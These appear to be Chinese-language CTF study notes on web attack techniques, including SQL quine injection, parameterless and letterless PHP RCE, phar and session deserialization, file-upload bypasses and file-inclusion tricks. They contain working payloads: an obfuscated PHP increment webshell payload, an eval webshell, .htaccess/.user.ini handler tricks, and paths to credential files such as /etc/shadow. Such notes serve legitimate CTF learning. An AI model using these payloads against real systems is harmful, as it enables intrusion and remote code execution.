# CTF扩展

## 知识点标签

### Java



### Injection

#### SQL

##### 二次注入

[CISCN2019 华北赛区 Day1 Web5]CyberPunk

#### update

[NewStarCTF2022]multiSQL

#### XSS

##### AngularJS Sandbox Bypass

[第二章 web进阶]XSS闯关 level6

#### GraphQL

[NewStarCTF2022]ezAPI

注入点：

```php
$data = '{"query":"query{\nusers_user_by_pk(id:' . $id . ') {\nname\n}\n}\n", "variables":null}';
```

### LFI

#### require_once

[NSSRound#8 Basic]MyPage

#### pear

[NewStarCTF2022]IncludeTwo

pear的标志模板：include $_GET['f'].php)

#### 包含日志文件

[HNCTF 2022 WEEK2]easy_include

### RCE

#### shell_exec

[NewStarCTF2022]So Baby RCE Again

#### PRCE

[NISACTF 2022]middlerce

### 序列化

#### 数组反序列化

[HUBUCTF 2022 新生赛]checkin

#### thinkphp5框架

[NewStarCTF2022]Maybe You Have To think More

#### SESSION

 [安洵杯 2019]easy_serialize_php

## 绕过总结

### 特殊符号过滤



#### php解析特性

##### 下划线绕过(替代)

[

(空格)

\+

 .

### 关键词过滤

大小写

双写

拼接（截断）

编码

关键词替换

## 基础拓展

### SQL

#### quine注入

quine指自产生程序，也就是输入的sql与输出的sql一致。

```sql
Quine基本形式：

replace(replace(‘str’,char(34),char(39)),char(46),‘str’)

先将str里的双引号替换成单引号，再用str替换str里的.

str基本形式（可以理解成上面的"."）

replace(replace(".",char(34),char(39)),char(46),".")

完整的Quine就是Quine基本形式+str基本形式
```

注入点：

```sql
$password=$_POST['passwd'];
$sql="SELECT passwd FROM users WHERE username='bilala' and passwd='$password';";
```

**payload**：

```sql
union select replace(replace('replace(replace(".",char(34),char(39)),char(46),".")',char(34),char(39)),char(46),'replace(replace(".",char(34),char(39)),char(46),".")');
```



```sql
1'/**/union/**/select/**/replace(replace('1"/**/union/**/select/**/replace(replace(".",char(34),char(39)),char(46),".")#',char(34),char(39)),char(46),'1"/**/union/**/select/**/replace(replace(".",char(34),char(39)),char(46),".")#')#
```

**绕过**：char可用**chr**、**十六进制**替换

### RCE

#### 无参数字母

##### 核心代码

```php
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {    
    eval($_GET['code']);
}
```

**[^\W]**匹配**[A-Za-z0-9]**

**[^\W]+\ (?\ )**匹配**a（）**但没有任何参数

**(?R)**代表递归匹配  a(b(c()))

所以只要提交不带参数的**php自有函数**即可正常执行

##### HTTP请求头（php7.3+）

###### getallheaders（）

apache_request

_headers（）

? = print_r(**pos**(getallheaders()))

显示**第一项**值

? = print_r(**end**(getallheaders()))

显示最后一项值

注意：文件头信息是从下往上读

**又或者**：

system(current(getallheaders()));

然后再HTTP头自己随意加一个参数进行命令执行

##### 全局变量（php5/7）

###### get_defined_vars()

##### session（php5）

##### scandir()

highlight_file(next(array_reverse(scandir(current(localeconv()))))); 

**next**代表指针指向文件地址

readfile(array_rand(array_flip(scandir(pos(localeconv())))));
 //随机读取文件内容

文件读取函数可交换

#### 无数字字母

##### 自增

$_=[];$_=@"$_";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);

ASSERT($_ POST[_])

%24_%3d%5b%5d%3b%24_%3d%40%22%24_%22%3b%24_%3d%24_%5b'!'%3d%3d'%40'%5d%3b%24___%3d%24_%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24____%3d'_'%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24_%3d%24%24____%3b%24___(%24_%5b_%5d)%3b


##### 取反

##### 异或



### PHP反序列化

若源码中没有进行反序列化操作，但是又可操控的魔术方法，可以考虑phar反序列化。当然前提是可以上传phar文件，且能进行文件读取。

#### phar反序列化

##### 前提：

修改php.ini中的**phar.readonly = Off**（试了好久）

##### 利用条件：

phar要能上传到服务器端：file_exists()   fopen()   file_get_contents()   file()

要有可用的魔术方法，且不能直接执行反序列化操作

文件操作函数参数可控

#### 字符串逃逸

在一串字符串序列化后将其中属性值进行了替换，然而数据化后属性长度未变，故会将其属性值增长或减少从而影响到其后的数据，可通过此实现属性的增多

#### session反序列化

#### 处理：

1.**php**

2.php_serialize

3.php_binary

#### 存储：

1.键名+竖线+经serialize（）函数序列化后的值

如：$_ SESSION['benben'] = $_ GET['ben'];

​       ?ben = dazhuang

​        benben|s:8:"dazhuang"

2.返回数组格式序列化

3.

### yaml反序列化

### 文件操作

#### 文件上传

**基本流程**

##### 后缀操作

特殊解析漏洞：php3,php5,phtml 

大小写绕过：PHP,pHP； 

点绕过：php.

空格绕过：php空格

::$$DATA绕过：shell.php::$$DATA

双后缀：shell.phphpp

单循环绕过：shell.php. .

假文件名绕过：shell.php/.

##### MIME

单纯的前端检测直接修改后缀即可，

当然可能还需要加上**文件头绕过**，

如果还不行可以尝试图片马。

##### 配置文件

.htaccess绕过：

 <FilesMatch “shell.jpg”>
 SetHandler application/x-httpd-php
 </FilesMatch>

.user.ini绕过：

 auto_prepend_file=shell.jpg

##### 短标签绕过

如果不管怎么改后缀都报错，一般就是对文件内容有**?><?**检测

绕过：<script language='php'>@eval($_POST[“cmd”]);</script>

#### 文件包含

require_once、include_once绕过

这两个函数指定的文件如果已经被包含过，则不会再次包含。它可以避免函数重定义，变量重新赋值等问题。（**不会多次包含**）

php的**文件包含机制**是将已经包含的文件与文件的真实路径放进哈希表中

原理：php底层源码研究，但是太难了，看不懂。。。

**利用**：`/proc/self`指向当前进程的`/proc/pid/`，`/proc/self/root/`是指向`/`的符号链接，想到这里，用**伪协议配合多级符号链接**的办法进行绕过

cwd 文件是一个指向当前进程运行目录的符号链接

## 小点积累

### 泄露文件

> 1.robots.txt
>
> 2.www.zip
>
> 3.index.php.swp
>
> vim编辑的index.php文件，在编辑状态强制退出终端，会在同目录下产生一个.index.php**.swp**文件，可以使用vim -r .index.php.swp恢复文件
>
> 4.index.php~
>
> 用gedit编辑器编辑保存的文件
>
> 5.readme.md

### 服务器信息

/etc

/etc/passwd

/etc/shadow

/etc/hosts

/proc

#### 日志文件

/var/log

#### Apache默认根目录

/var/www/html

### http本地访问

修改：XFF or client-ip or X-Real-IP

### 加密方式

mt_rand()、mt_srand()

**\uXXXX**可以在**JSON**中转义字符，例如A与\u0041等效，即可用unicode编码绕过关键词过滤

